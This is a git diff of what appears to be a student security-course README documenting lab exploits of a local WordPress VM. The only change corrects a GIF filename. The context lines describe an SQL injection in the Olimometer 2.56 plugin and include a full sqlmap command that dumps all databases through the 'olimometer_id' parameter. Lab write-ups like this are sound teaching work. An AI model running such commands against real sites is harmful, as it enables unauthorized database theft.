@@ -37,7 +37,7 @@ Time spent: **20** hours spent in total
     - Vulnerability types: SQLi
     - Tested in version: 2.56
     - Fixed in version: (unfixed)
-  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek8LiveTargets/blob/master/W8_Olimomemeter.gif)
+  - [ ] GIF Walkthrough: ![](https://github.com/dallens/CodepathWeek8LiveTargets/blob/master/W8_Olimometer.gif)
   - [ ] Steps to recreate: 
     - 1. Based on the exploit listed at [Link Exploit](https://packetstormsecurity.com/files/139921/WordPress-Olimometer-2.56-SQL-Injection.html)
     - 2. sqlmap -u http://wpdistillery.vm/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1 -p "olimometer_id" -a --dbs --threads=5 --random-agent --no-cast
